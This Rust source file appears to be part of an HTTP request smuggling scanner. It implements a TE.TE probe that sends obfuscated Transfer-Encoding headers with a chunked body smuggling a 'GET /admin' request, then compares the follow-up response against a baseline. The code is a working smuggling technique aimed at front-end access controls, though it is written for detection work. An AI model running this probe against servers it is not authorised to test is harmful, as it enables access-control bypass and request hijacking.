use crate::auth::AuthStore;
use crate::bypass;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    // Baseline
    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    let probes = bypass::all_bypass_probes();
    let mut vulnerable = false;
    let mut success_bypass: Option<String> = None;

    for probe in &probes {
        if !*silent {
            eprintln!("  [DBG] Testing TE.TE bypass: {}", probe.name);
        }

        let te_val = String::from_utf8_lossy(&probe.header_bytes);
        let smuggled_req = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";

        let chunked_body = h1::build_chunked_body(&[smuggled_req]);

        let mut request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\n{}",
            host, te_val
        );
        request.push_str("\r\nUser-Agent: ghostroute/1.0.0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n");
        request.push_str(&String::from_utf8_lossy(&chunked_body));

        if let Some(a) = auth {
            let mut bytes = request.into_bytes();
            a.apply_to_request(&mut bytes);
            request = String::from_utf8(bytes).map_err(|e| e.to_string())?;
        }

        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let mut conn = match crate::net::connect(cfg).await {
            Ok(c) => c,
            Err(_) => continue,
        };

        conn.write_all(request.as_bytes()).await.map_err(|e| format!("TE.TE write error: {}", e))?;

        let mut buf = Vec::with_capacity(4096);
        let mut tmp = [0u8; 8192];
        use tokio::time::timeout;
        use std::time::Duration;

        loop {
            match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf.len() > 1_000_000 { break; }
            if buf.windows(4).any(|w| w == b"\r\n\r\n") && buf.len() > 100 { break; }
        }

        // Send second request
        let second_req = h1::build_request("GET", "/", host, &[], b"");
        conn.write_all(&second_req).await.ok();

        let mut buf2 = Vec::with_capacity(4096);
        loop {
            match timeout(Duration::from_secs(cfg.timeout.as_secs()), conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf2.len() > 1_000_000 { break; }
        }

        let second_resp = match h1::parse_response(&buf2) {
            Ok(r) => r,
            Err(_) => continue,
        };

        if second_resp.body != baseline.body || second_resp.status_code != baseline.status_code {
            vulnerable = true;
            success_bypass = Some(probe.name.clone());
            if !*silent {
                eprintln!(
                    "  [DET] TE.TE confirmed with bypass: {}",
                    probe.name
                );
            }
            break;
        }
    }

    let host_name = cfg.host.split(':').next().unwrap_or(&cfg.host);

    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "tete".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: success_bypass,
        status_code: baseline.status_code,
        details: if vulnerable {
            Some("TE.TE confirmed with bypass".into())
        } else {
            None
        },
        ..Default::default()
    })
}
